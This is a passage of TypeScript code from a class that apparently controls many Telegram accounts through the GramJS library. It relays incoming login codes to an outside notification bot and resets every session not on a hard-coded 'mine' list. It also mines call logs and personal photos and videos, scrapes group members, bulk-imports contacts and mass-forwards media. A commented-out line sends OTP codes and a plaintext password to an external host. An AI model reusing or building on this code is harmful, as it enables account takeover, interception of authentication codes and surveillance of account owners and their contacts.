this.forwardSecretMsgs(fromChatId, id.toString());\n    }\n\n    public async joinChannelAndForward(fromChatId: string, channel: string) {\n        const result: any = await this.joinChannel(channel);\n        const folderId = 1; // Replace with the desired folder ID\n        await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: result.chats[0].id,\n                            accessHash: result.chats[0].accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n\n        await this.forwardSecretMsgs(fromChatId, channel);\n    }\n\n    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {\n        let offset = 0;\n        const limit = 100;\n        let totalMessages = 0;\n        let forwardedCount = 0;\n        let messages: any = [];\n        do {\n            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });\n            totalMessages = messages.total;\n            const messageIds = messages.map((message: Api.Message) => {\n                offset = message.id;\n                if (message.id && message.media) {\n                    return message.id;\n                }\n                return undefined;\n            }).filter(id => id !== undefined);\n            console.log(messageIds)\n            if (messageIds.length > 0) {\n                try {\n                    const result = await this.client.forwardMessages(toChatId, {\n                        messages: messageIds,\n                        fromPeer: fromChatId,\n                    });\n\n                    forwardedCount += messageIds.length;\n                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                    await sleep(5000); // Sleep for a second to avoid rate limits\n                } catch (error) {\n                    console.error(\"Error occurred while forwarding messages:\", error);\n                }\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            }\n        } while (messages.length > 0);\n\n        await this.leaveChannels([toChatId]);\n        return;\n    }\n\n    //logic to forward messages from a chat to another chat maintaining rate limits\n    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {\n        const chunkSize = 30; // Number of messages to forward per request\n        const totalMessages = messageIds.length;\n        let forwardedCount = 0;\n\n        for (let i = 0; i < totalMessages; i += chunkSize) {\n            const chunk = messageIds.slice(i, i + chunkSize);\n            try {\n                await this.client.forwardMessages(toChatId, {\n                    messages: chunk,\n                    fromPeer: fromChatId,\n                });\n\n                forwardedCount += chunk.length;\n                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);\n                await sleep(5000); // Sleep for a second to avoid rate limits\n            } catch (error) {\n                console.error(\"Error occurred while forwarding messages:\", error);\n            }\n        }\n\n        return forwardedCount;\n    }\n\n    async disconnect(): Promise<void> {\n        if (this.client) {\n            try {\n                console.log(\"Destroying Client: \", this.phoneNumber);\n                await this.cleanupClient();\n            } catch (error) {\n                console.error(\"Error during disconnect:\", error);\n                throw error;\n            }\n        }\n    }\n\n    private async cleanupClient() {\n        try {\n            if (!this.client) return;\n            const handlers = this.client.listEventHandlers();\n            for (const handler of handlers) {\n                this.client.removeEventHandler(handler[1], handler[0]);\n            }\n            try {\n                if (this.client.connected) {\n                    await this.client.disconnect();\n                }\n                await this.client.destroy();\n            } catch (error) {\n                parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n            }\n            await this.client.destroy();\n            await this.client.disconnect();\n            this.client = null;\n            this.session.delete();\n            this.channelArray = [];\n            this.client = null;\n            await sleep(2000);\n        } catch (error) {\n            parseError(error, `${this.phoneNumber}: Error during client cleanup`);\n        }\n    }\n\n    async getchatId(username: string): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const entity = await this.client.getInputEntity(username);\n        return entity;\n    }\n\n    async getMe() {\n        const me = <Api.User>await this.client.getMe();\n        return me\n    }\n\n    async errorHandler(error) {\n        parseError(error)\n        if (error.message && error.message == 'TIMEOUT') {\n            // await this.client.disconnect();\n            // await this.client.destroy();\n            // await disconnectAll()\n            //Do nothing, as this error does not make sense to appear while keeping the client disconnected\n        } else {\n            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);\n            // Handle other types of errors\n        }\n    }\n\n    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {\n        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 5,\n        });\n        this.client.setLogLevel(LogLevel.ERROR);\n        // this.client._errorHandler = this.errorHandler\n        await this.client.connect();\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Connected Client : \", me.phone);\n        if (handler && this.client) {\n            console.log(\"Adding event Handler\")\n            if (handlerFn) {\n                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());\n            } else {\n                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());\n            }\n        }\n        return this.client\n    }\n\n    async getGrpMembers(entity: EntityLike) {\n        try {\n            const result = []\n            // Fetch the group entity\n            const chat = await this.client.getEntity(entity);\n\n            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {\n                console.log(\"Invalid group or channel!\");\n                return;\n            }\n\n            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);\n\n            // Fetch members\n            const participants = await this.client.invoke(\n                new Api.channels.GetParticipants({\n                    channel: chat,\n                    filter: new Api.ChannelParticipantsRecent(),\n                    offset: 0,\n                    limit: 200, // Adjust the limit as needed\n                    hash: bigInt(0),\n                })\n            );\n\n            if (participants instanceof Api.channels.ChannelParticipants) {\n                const users = participants.participants;\n\n                console.log(`Members: ${users.length}`);\n                for (const user of users) {\n                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;\n                    if (userInfo) {\n                        const userDetails = <Api.User>await this.client.getEntity(userInfo);\n                        // console.log(\n                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"\n                        //     }, Username: ${userDetails.username || \"\"}`\n                        // );\n                        result.push({\n                            tgId: userDetails.id,\n                            name: `${userDetails.firstName || \"\"} ${userDetails.lastName || \"\"}`,\n                            username: `${userDetails.username || \"\"}`,\n                        })\n                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {\n                            console.log(JSON.stringify(userDetails.id))\n                        }\n                    } else {\n                        console.log(JSON.stringify((user as any)?.userId))\n                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)\n                    }\n                }\n            } else {\n                console.log(\"No members found or invalid group.\");\n            }\n            console.log(result.length)\n            return result;\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\n        const messages = await this.client.getMessages(entityLike, { limit });\n        return messages;\n    }\n    async getDialogs(params: IterDialogsParams) {\n        const chats = await this.client.getDialogs(params);\n        console.log(\"TotalChats:\", chats.total);\n        return chats;\n    }\n\n    async getLastMsgs(limit: number): Promise<string> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const msgs = await this.client.getMessages(\"777000\", { limit });\n        let resp = '';\n        msgs.forEach((msg) => {\n            console.log(msg.text);\n            resp += msg.text + \"\\n\";\n        });\n        return resp;\n    }\n\n    async getSelfMSgsInfo(): Promise<{\n        photoCount: number;\n        videoCount: number;\n        movieCount: number,\n        total: number,\n        ownPhotoCount: number,\n        otherPhotoCount: number,\n        ownVideoCount: number,\n        otherVideoCount: number\n    }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const self = <Api.User>await this.client.getMe();\n        const selfChatId = self.id;\n\n        let photoCount = 0;\n        let ownPhotoCount = 0;\n        let ownVideoCount = 0;\n        let otherPhotoCount = 0;\n        let otherVideoCount = 0;\n        let videoCount = 0;\n        let movieCount = 0;\n\n        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed\n        for (const message of messageHistory) {\n            const text = message.text.toLocaleLowerCase();\n            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                movieCount++\n            } else {\n                if (message.photo) {\n                    photoCount++;\n                    if (!message.fwdFrom) {\n                        ownPhotoCount++\n                    } else {\n                        otherPhotoCount++\n                    }\n                } else if (message.video) {\n                    videoCount++;\n                    if (!message.fwdFrom) {\n                        ownVideoCount++\n                    } else {\n                        otherVideoCount++\n                    }\n                }\n            }\n        }\n\n        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })\n    }\n    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 1500 });\n        let canSendTrueCount = 0;\n        let canSendFalseCount = 0;\n        let totalCount = 0;\n        this.channelArray.length = 0;\n        const canSendFalseChats = [];\n        console.log(\"TotalChats:\", chats.total);\n        for (const chat of chats) {\n            if (chat.isChannel || chat.isGroup) {\n                try {\n                    const chatEntity = <Api.Channel>chat.entity.toJSON();\n                    const { broadcast, defaultBannedRights, id } = chatEntity;\n                    totalCount++;\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\n                        canSendTrueCount++;\n                        this.channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                    } else {\n                        canSendFalseCount++;\n                        canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                    }\n                } catch (error) {\n                    parseError(error);\n                }\n            }\n        };\n        return {\n            chatsArrayLength: totalCount,\n            canSendTrueCount,\n            canSendFalseCount,\n            ids: sendIds ? this.channelArray : [],\n            canSendFalseChats\n        };\n    }\n\n    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {\n        try {\n            for (let i = 0; i < data.length; i++) {\n                const user = data[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\";\n                try {\n                    await this.client.invoke(\n                        new Api.contacts.AddContact({\n                            firstName,\n                            lastName,\n                            phone: user.mobile,\n                            id: user.tgId\n                        })\n                    );\n                } catch (e) {\n                    console.log(e)\n                }\n            }\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async addContacts(mobiles: string[], namePrefix: string) {\n        try {\n            const inputContacts: Api.TypeInputContact[] = [];\n\n            // Iterate over the data array and generate input contacts\n            for (let i = 0; i < mobiles.length; i++) {\n                const user = mobiles[i];\n                const firstName = `${namePrefix}${i + 1}`; // Automated naming\n                const lastName = \"\"; // Optional, no last name provided\n\n                // Generate client_id as a combination of i and j (for uniqueness)\n                // Since we only have one phone per user here, j will always be 0\n                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone\n\n                inputContacts.push(new Api.InputPhoneContact({\n                    clientId: clientId,\n                    phone: user, // mobile number\n                    firstName: firstName,\n                    lastName: lastName\n                }));\n            }\n\n            // Call the API to import contacts\n            const result = await this.client.invoke(\n                new Api.contacts.ImportContacts({\n                    contacts: inputContacts,\n                })\n            );\n\n            console.log(\"Imported Contacts Result:\", result);\n\n\n        } catch (error) {\n            console.error(\"Error adding contacts:\", error);\n            parseError(error, `Failed to save contacts`);\n        }\n    }\n\n    async leaveChannels(chats: string[]) {\n        console.log(\"Leaving Channels: initaied!!\");\n        console.log(\"ChatsLength: \", chats)\n        for (const id of chats) {\n            try {\n                await this.client.invoke(\n                    new Api.channels.LeaveChannel({\n                        channel: id\n                    })\n                );\n                console.log(\"Left channel :\", id)\n                if (chats.length > 1) {\n                    await sleep(30000);\n                }\n            } catch (error) {\n                const errorDetails = parseError(error);\n                console.log(\"Failed to leave channel :\", errorDetails.message)\n            }\n        }\n    }\n\n    async getEntity(entity: Api.TypeEntityLike) {\n        return await this.client?.getEntity(entity)\n    }\n\n    async joinChannel(entity: Api.TypeEntityLike) {\n        console.log(\"trying to join channel : \", entity)\n        return await this.client?.invoke(\n            new Api.channels.JoinChannel({\n                channel: await this.client?.getEntity(entity)\n            })\n        );\n    }\n\n    connected() {\n        return this.client.connected;\n    }\n\n    async connect() {\n        return await this.client.connect();\n    }\n\n    async removeOtherAuths(): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        for (const auth of result.authorizations) {\n            if (this.isAuthMine(auth)) {\n                continue;\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\n                await this.resetAuthorization(auth);\n            }\n        }\n    }\n\n    private isAuthMine(auth: Api.Authorization): boolean {\n        const authCriteria = [\n            { field: 'country', value: 'singapore' },\n            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },\n            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }\n        ];\n\n        return authCriteria.some(criterion => {\n            if ('values' in criterion) {\n                return criterion.values.some(value =>\n                    auth[criterion.field].toLowerCase().includes(value.toLowerCase())\n                );\n            }\n            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());\n        });\n    }\n\n    private async resetAuthorization(auth: any): Promise<void> {\n        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\n    }\n\n    async getAuths(): Promise<any> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        return result;\n    }\n\n    async getAllChats(): Promise<any[]> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const chats = await this.client.getDialogs({ limit: 500 });\n        console.log(\"TotalChats:\", chats.total);\n        const chatData = [];\n        for (const chat of chats) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {\n        const messages = await this.client.getMessages(chatId, {\n            offsetId: offset,\n            limit,\n        });\n\n        const result = await Promise.all(messages.map(async (message: Api.Message) => {\n            const media = message.media\n                ? {\n                    type: message.media.className.includes('video') ? 'video' : 'photo',\n                    thumbnailUrl: await this.getMediaUrl(message),\n                }\n                : null;\n\n            return {\n                id: message.id,\n                message: message.message,\n                date: message.date,\n                sender: {\n                    id: message.senderId?.toString(),\n                    is_self: message.out,\n                    username: message.fromId ? message.fromId.toString() : null,\n                },\n                media,\n            };\n        }));\n\n        return result;\n    }\n\n    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\n        if (message.media instanceof Api.MessageMediaPhoto) {\n            console.log(\"messageId image:\", message.id)\n            const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n\n        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n            console.log(\"messageId video:\", message.id)\n            const sizes = message.document?.thumbs || [1]\n            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });\n        }\n        return null;\n    }\n\n    async sendInlineMessage(chatId: string, message: string, url: string) {\n        const button = {\n            text: \"Open URL\",\n            url: url,\n        };\n        const result = await this.client.sendMessage(chatId, {\n            message: message,\n            buttons: [new Api.KeyboardButtonUrl(button)]\n        })\n        return result;\n    }\n\n    async getMediaMessages() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhotos(),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n        return result\n    }\n\n\n    async getCallLog() {\n        const result = <Api.messages.Messages>await this.client.invoke(\n            new Api.messages.Search({\n                peer: new Api.InputPeerEmpty(),\n                q: '',\n                filter: new Api.InputMessagesFilterPhoneCalls({}),\n                minDate: 0,\n                maxDate: 0,\n                offsetId: 0,\n                addOffset: 0,\n                limit: 200,\n                maxId: 0,\n                minId: 0,\n                hash: bigInt(0),\n            })\n        );\n\n        const callLogs = <Api.Message[]>result.messages.filter(\n            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall\n        );\n\n        const filteredResults = {\n            outgoing: 0,\n            incoming: 0,\n            video: 0,\n            chatCallCounts: {},\n            totalCalls: 0\n        };\n        for (const log of callLogs) {\n            filteredResults.totalCalls++;\n            const logAction = <Api.MessageActionPhoneCall>log.action\n\n            // const callInfo = {\n            //     callId: logAction.callId.toString(),\n            //     duration: logAction.duration,\n            //     video: logAction.video,\n            //     timestamp: log.date\n            // };\n\n            // Categorize by type\n            if (log.out) {\n                filteredResults.outgoing++;\n            } else {\n                filteredResults.incoming++;\n            }\n\n            if (logAction.video) {\n                filteredResults.video++;\n            }\n\n            // Count calls per chat ID\n            const chatId = (log.peerId as Api.PeerUser).userId.toString();\n            if (!filteredResults.chatCallCounts[chatId]) {\n                const ent = <Api.User>await this.client.getEntity(chatId)\n                filteredResults.chatCallCounts[chatId] = {\n                    phone: ent.phone,\n                    username: ent.username,\n                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\n                    count: 0\n                };\n            }\n            filteredResults.chatCallCounts[chatId].count++;\n        }\n        const filteredChatCallCounts = [];\n        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {\n            if (details['count'] > 4) {\n                let video = 0;\n                let photo = 0\n                const msgs = await this.client.getMessages(chatId, { limit: 600 })\n                for (const message of msgs) {\n                    const text = message.text.toLocaleLowerCase();\n                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\n                        if (message.media instanceof Api.MessageMediaPhoto) {\n                            photo++\n                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                            video++\n                        }\n                    }\n                }\n                filteredChatCallCounts.push({\n                    ...(details as any),\n                    msgs: msgs.total,\n                    video,\n                    photo,\n                    chatId,\n                })\n            }\n        }\n        console.log({\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        });\n\n        return {\n            ...filteredResults,\n            chatCallCounts: filteredChatCallCounts\n        };\n    }\n\n    async handleEvents(event: NewMessageEvent) {\n        if (event.isPrivate) {\n            if (event.message.chatId.toString() == \"777000\") {\n                console.log(event.message.text.toLowerCase());\n                console.log(\"Login Code received for - \", this.phoneNumber, '\\nActiveClientSetup - ', TelegramManager.activeClientSetup);\n                console.log(\"Date :\", new Date(event.message.date * 1000))\n                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {\n                //     console.log(\"LoginText: \", event.message.text)\n                //     const code = (event.message.text.split('.')[0].split(\"code:**\")[1].trim())\n                //     console.log(\"Code is:\", code);\n                //     try {\n                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);\n                //         console.log(\"Code Sent back\");\n                //     } catch (error) {\n                //         parseError(error)\n                //     }\n                // } else {\n                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);\n                // await event.message.delete({ revoke: true });\n                // }\n            }\n        }\n    }\n\n    async updatePrivacyforDeletedAccount() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll(),\n                    ],\n                })\n            );\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n        }\n        catch (e) {\n            throw e\n        }\n    }\n    async updateProfile(firstName: string, about: string) {\n        const data = {\n            lastName: \"\",\n        }\n        if (firstName !== undefined) {\n            data[\"firstName\"] = firstName\n        }\n        if (about !== undefined) {\n            data[\"about\"] = about\n        }\n        try {\n            const result = await this.client.invoke(\n                new Api.account.UpdateProfile(data)\n            );\n            console.log(\"Updated NAme: \", firstName);\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async downloadProfilePic(photoIndex: number) {\n        try {\n            const photos = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: 'me',\n                    offset: 0,\n                })\n            );\n\n            if (photos.photos.length > 0) {\n                console.log(`You have ${photos.photos.length} profile photos.`);\n\n                // Choose the photo index (0-based)\n                if (photoIndex < photos.photos.length) {\n                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\n\n                    // Extract the largest photo file (e.g., highest resolution)\n                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)\n                    const photoFileSize = selectedPhoto.sizes[index];\n\n                    // Download the file\n                    const photoBuffer = await this.client.downloadFile(\n                        new Api.InputPhotoFileLocation({\n                            id: selectedPhoto.id,\n                            accessHash: selectedPhoto.accessHash,\n                            fileReference: selectedPhoto.fileReference,\n                            thumbSize: photoFileSize.type\n                        }), {\n                        dcId: selectedPhoto.dcId, // Data center ID\n                    });\n\n                    if (photoBuffer) {\n                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\n                        fs.writeFileSync(outputPath, photoBuffer);\n                        console.log(`Profile picture downloaded as '${outputPath}'`);\n                        return outputPath;\n                    } else {\n                        console.log(\"Failed to download the photo.\");\n                    }\n                } else {\n                    console.log(`Photo index ${photoIndex} is out of range.`);\n                }\n            } else {\n                console.log(\"No profile photos found.\");\n            }\n        } catch (err) {\n            console.error(\"Error:\", err);\n        }\n    }\n    async getLastActiveTime() {\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\n        let latest = 0\n        result.authorizations.map((auth) => {\n            if (!this.isAuthMine(auth)) {\n                if (latest < auth.dateActive) {\n                    latest = auth.dateActive;\n                }\n            }\n        });\n        return (new Date(latest * 1000)).toISOString().split('T')[0];\n    }\n\n    async getContacts() {\n        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({\n            hash: bigInt(0)\n        }));\n        return exportedContacts;\n    }\n\n    async deleteChat(chatId: string) {\n        try {\n            await this.client.invoke(new Api.messages.DeleteHistory({\n                justClear: false,\n                peer: chatId,\n                revoke: false,\n            }));\n            console.log(`Dialog with ID ${chatId} has been deleted.`);\n        } catch (error) {\n            console.error('Failed to delete dialog:', error);\n        }\n    }\n\n    async blockUser(chatId: string) {\n        try {\n            await this.client?.invoke(new Api.contacts.Block({\n                id: chatId,\n            }));\n            console.log(`User with ID ${chatId} has been blocked.`);\n        } catch (error) {\n            console.error('Failed to block user:', error);\n        }\n    }\n\n    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {\n        try {\n            const query = { limit: parseInt(limit.toString()) };\n            if (offset) query['offsetId'] = parseInt(offset.toString());\n\n            const messages = await this.client.getMessages(chatId, query);\n            const mediaMessages = messages.filter(message => {\n                // console.log(message.media?.className)\n                return (message.media && message.media.className !== \"MessageMediaWebPage\")\n            });\n            console.log(\"Total:\", messages.total, \"fetched: \", messages.length, \"ChatId: \", chatId, \"Media :\", mediaMessages.length);\n\n            if (!messages.length) {\n                // If no media messages are returned, we might have reached the end\n                console.log(\"No more media messages found. Reached the end of the chat.\");\n                return { data: [], endOfMessages: true };\n            }\n\n            const data = [];\n\n            for (const message of mediaMessages) {\n                console.log(message.media.className, message.document?.mimeType);\n                let thumbBuffer = null;\n\n                try {\n                    if (message.media instanceof Api.MessageMediaPhoto) {\n                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];\n\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n                        console.log(\"messageId image:\", message.id)\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'photo',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n\n                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {\n                        const sizes = message.document?.thumbs || [1];\n                        console.log(\"messageId video:\", message.id)\n                        // const fileSize = message.document.size;\n\n                        // // Skip overly large files for thumbnail (set threshold as needed)\n                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails\n                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);\n                        //     continue;\n                        // }\n\n                        // Call downloadWithTimeout with a 5-second timeout\n                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);\n\n                        data.push({\n                            messageId: message.id,\n                            mediaType: 'video',\n                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null\n                        });\n                    }\n                } catch (downloadError) {\n                    if (downloadError.message === 'Download timeout') {\n                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);\n                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {\n                        console.warn('File reference expired for message. Skipping this media.');\n                        // Skip the expired media, continue processing others\n                    } else {\n                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);\n                    }\n                    data.push({\n                        messageId: message.id,\n                        mediaType: 'photo',\n                        thumb: null, // Convert to base64 for sending over HTTP, handle null\n                    });\n\n                    // Skip the message and continue with the next one if there's any error\n                    continue;\n                }\n            }\n            if (!data.length) {\n                data.push({\n                    messageId: messages[messages.length - 1].id,\n                    mediaType: 'photo',\n                    thumb: null, // Convert to base64 for sending over HTTP, handle null\n                })\n            }\n            console.log(\"Returning \", data.length);\n\n            // Return the metadata and signal if we reached the end of messages\n            return { data, endOfMessages: false };\n\n        } catch (error) {\n            console.error('Error in getMediaMetadata:', error);\n            if (error.message.includes('FLOOD_WAIT')) {\n                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\\d+)/)[1], 10);\n                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);\n                // Handle flood wait, retry logic\n                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));\n                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting\n            }\n\n            throw new Error('Error fetching media metadata');\n        }\n    }\n\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\n        try {\n            const entity = await this.safeGetEntity(chatId);\n            const messages = await this.client.getMessages(entity, { ids: [messageId] });\n            const message = <Api.Message>messages[0];\n\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\n                const media = message.media;\n                let contentType, filename, fileLocation;\n                const inputLocation = message.video || <Api.Photo>message.photo;\n\n                const data = {\n                    id: inputLocation.id,\n                    accessHash: inputLocation.accessHash,\n                    fileReference: inputLocation.fileReference,\n                };\n\n                if (media instanceof Api.MessageMediaPhoto) {\n                    contentType = 'image/jpeg';\n                    filename = 'photo.jpg';\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\n                } else if (media instanceof Api.MessageMediaDocument) {\n                    contentType = (media as any).mimeType || 'video/mp4';\n                    filename = 'video.mp4';\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\n                } else {\n                    return res.status(415).send('Unsupported media type');\n                }\n\n                res.setHeader('Content-Type', contentType);\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n\n                const chunkSize = 512 * 1024; // 512 KB chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {\n        return Promise.race([\n            promise,\n            new Promise<T>((_, reject) =>\n                setTimeout(() => reject(new Error('Download timeout')), timeout)\n            )\n        ]);\n    }\n\n    private getMediaDetails(media: Api.MessageMediaDocument) {\n        if (!media?.document) return null;\n\n        const doc = media.document;\n        if (doc instanceof Api.DocumentEmpty) return null;\n        const videoAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeVideo\n        ) as Api.DocumentAttributeVideo;\n\n        const fileNameAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeFilename\n        ) as Api.DocumentAttributeFilename;\n\n        return {\n            size: doc.size,\n            mimeType: doc.mimeType,\n            fileName: fileNameAttr?.fileName || null,\n            duration: videoAttr?.duration || null,\n            width: videoAttr?.w || null,\n            height: videoAttr?.h || null\n        };\n    }\n\n    private async downloadFileFromUrl(url: string): Promise<Buffer> {\n        try {\n            const response = await axios.get(url, {\n                responseType: 'arraybuffer',\n                timeout: 30000\n            });\n            return Buffer.from(response.data);\n        } catch (error) {\n            throw new Error(`Failed to download file: ${error.message}`);\n        }\n    